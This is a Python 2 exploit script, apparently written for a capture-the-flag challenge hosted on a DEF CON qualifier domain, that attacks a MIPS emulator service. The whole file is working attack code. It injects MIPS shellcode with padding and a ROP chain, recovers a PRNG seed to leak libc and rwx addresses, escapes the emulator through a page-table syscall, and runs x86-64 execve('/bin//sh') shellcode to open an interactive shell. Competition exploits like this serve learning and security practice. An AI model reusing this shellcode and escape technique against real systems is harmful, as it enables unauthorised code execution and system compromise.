#!/usr/bin/env python2
import socket
import struct
import telnetlib
import sys, time
import pwn

HOST, PORT = "127.0.0.1", 1234
HOST, PORT = "reeses_fc849330ede1f497195bad5213deaebc.quals.shallweplayaga.me", 3456

p32 = lambda v: struct.pack("<I", v)
p64 = lambda v: struct.pack("<Q", v)

s = socket.create_connection((HOST,PORT))
def ru(a):
        d = ""
        while not d.endswith(a):
                c = s.recv(4096)
                d += c
                #print `d`
                if not c:
                        print `d`
                        assert(c)
        return d
def rus(n):
        d = ""
        while len(d) < n:
                c = s.recv(n - len(d))
                d += c
                #print `d`
                if not c:
                        print `d`
                        assert(c)
        return d
sn = lambda d: s.sendall(str(d) + "\n")
ss = lambda d: s.sendall(p32(len(d)) + d)

ss(open("sample1").read())
ru("<<RUNNING>>\n")

def action(a, d, receive=True):
        s.sendall(chr(a))
        ss(d)
        if receive:
                len_ = struct.unpack("I", rus(4))[0]
                return rus(len_)

def bitpack(*args):
        bits = ""
        for s in args:
                if isinstance(s, str):
                        for c in s:
                                bits += "1" + bin(0x100|ord(c))[3:]
                else:
                        bits += "0" + bin((1<<13)|(s[0]&0x1fff))[3:] + bin((1<<5)|(s[1]&0x1f))[3:]
        while len(bits) & 7:
                bits += "0"# + "0"*8
        s = ""
        for i in xrange(0, len(bits), 8):
                s += chr(int(bits[i:][:8], 2))
        return s

class Rand(object):
        def __init__(self, seed):
                self.state = 0;
                self.data = [0]*32
                self.data[0] = seed;
                for idx in xrange(31):
                        v = (self.data[idx] >> 30)
                        v &= 0x3fffffff
                        v += idx + 1
                        v ^= self.data[idx]
                        v *= 524287
                        v &= 0xffffffff
                        self.data[idx + 1] = v

        def rand(self):
                v0 = self.data[(self.state + 24) & 0x1f]
                v1 = (self.state + 31) & 0x1f
                v3 = v4 = r = 0

                v3 ^= self.data[self.state]
                v3 ^= self.data[(self.state + 3) & 0x1f]
                v3 ^= 0xffffff & (self.data[(self.state + 3) & 0x1f] >> 8)
                v3 &= 0xffffffff

                v4 ^= self.data[(self.state + 10) & 0x1f] << 14
                v4 ^= v0 << 19
                v4 ^= v0
                v4 ^= self.data[(self.state + 10) & 0x1f]
                v4 &= 0xffffffff

                r ^= v4 << 13
                r ^= v3 << 7
                r ^= v4
                r ^= v3
                r ^= self.data[v1] << 11
                r ^= self.data[v1]
                r &= 0xffffffff

                self.data[self.state] = v4 ^ v3
                self.data[v1] = r
                self.state = v1
                return r

pwn.context.update(arch='mips', endian='little', bits=32, os='linux')

def write32_to_vaddr(addr, value):
        SC = ""
        SC += sc.mov("$a0", addr)
        SC += sc.mov("$a1", value)
        SC += "sw $a1, 0($a0)\n"
        return SC
def set_vaddr_to_paddr(vaddr, paddr):
        assert(vaddr & 0xfff == 0)
        vpage = vaddr >> 12
        SC = ""
        SC += sc.mov("$a0", 0x1000008 + 16 * vpage)
        SC += sc.mov("$a1", paddr & 0xffffffff)
        SC += sc.mov("$a2", paddr >> 32)
        SC += sc.mov("$a3", 1)
        SC += "sw $a1, 0($a0)\n"
        SC += "sw $a2, 4($a0)\n"
        SC += "sw $a3, 8($a0)\n"
        #SC += write32_to_vaddr(0x1000008 + 16 * vpage, paddr & 0xffffffff)
        #SC += write32_to_vaddr(0x1000008 + 16 * vpage + 4, paddr >> 32)
        #SC += write32_to_vaddr(0x1000008 + 16 * vpage + 8, 1)
        return SC
sc=pwn.pwnlib.shellcraft.mips
shellcode = ""

#get time and some rand values
shellcode += sc.linux.syscall(4000+13)
shellcode += sc.push("$v0")
for _ in xrange(32):
        shellcode += sc.linux.syscall(4000+5)
        shellcode += sc.push("$v0")
shellcode += sc.linux.syscall(4004, 1, "$sp", 4*33)

#mmap a rwx page
shellcode += sc.linux.syscall(4000+14, 0x4c0000, 4096)

#0x657a697320746365 0x2e 0x5d30
#0x30c00040001 0x10 0xec0 <-

#read new value for pagetable + 8
shellcode += sc.linux.syscall(4003, 0, 0x1000000 + 8, 8)

#read shellcode
shellcode += sc.linux.syscall(4003, 0, 0x4c0000, 1024)

#execute syscall that calls 0x30c00040001 + *(_QWORD*)(pagetable + 8)
shellcode += sc.linux.syscall(0xffffffff & (4000 + ((0xec0 - 0x208CC0)/16)))

#dump pagetable
#shellcode += sc.linux.syscall(4004, 1, 0x1000000, 1024)

#exit
shellcode += sc.linux.syscall(4001)

print shellcode
shellcode = pwn.asm(shellcode)


ropchain = struct.pack("I", 0x040A0B8)*128
padding = 0x25d18 - len(shellcode)
padding = 0x25d00 - len(shellcode)
padding_full = padding / 0x21
padding_last = padding % 0x21
if padding_last < 2:
        extra_padding = "A"*padding_last
        padding_last = 0x21
        padding_full -= 1
d = bitpack(*([shellcode] + [(0,0x1f)]*padding_full + [(0,padding_last-2)] + [ropchain]))
assert(len(d) < 0x4000)
action(1, d, False)

rnd = struct.unpack("I"*33, rus(33*4))
#for i in struct.unpack("Q"*(1024/8), rus(1024)):
#       print hex(i)
rnd,tim = rnd[:32][::-1], rnd[-1]
print "time:", tim
print "random:", rnd

import subprocess
p = subprocess.Popen("./find_seed %d" % rnd[0], shell=True, stdout=subprocess.PIPE)
seed = None
while 1:
        buf = ""
        while len(buf) != 4:
                c = p.stdout.read(4 - len(buf))
                buf += c
                assert(c)
        seed = struct.unpack("I", buf)[0]
        R = Rand(seed)
        for i, wanted in enumerate(rnd):
                if wanted != R.rand():
                        print "seed", seed, "fails at", i
                        break
        else:
                break
del p

print "seed:", seed
printf = ((seed ^ tim) << 12) | 0x700000000aaa
print "printf:", hex(printf)
libc_base = printf - 0x5aaaa
print "libc:", hex(libc_base)

R = Rand(seed)
[R.rand() for _ in xrange(32)]
rwx = R.rand()
rwx = 0x400000000000 | (rwx << 12)
print "rwx:", hex(rwx)

raw_input()
X86SC = "\xeb\xfe"
X86SC = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s.sendall(struct.pack("QQ", rwx - 0x30c00040001 + 1, rwx + 8) + X86SC)

t = telnetlib.Telnet()
#t.set_debuglevel(99999)
t.sock = s
t.interact()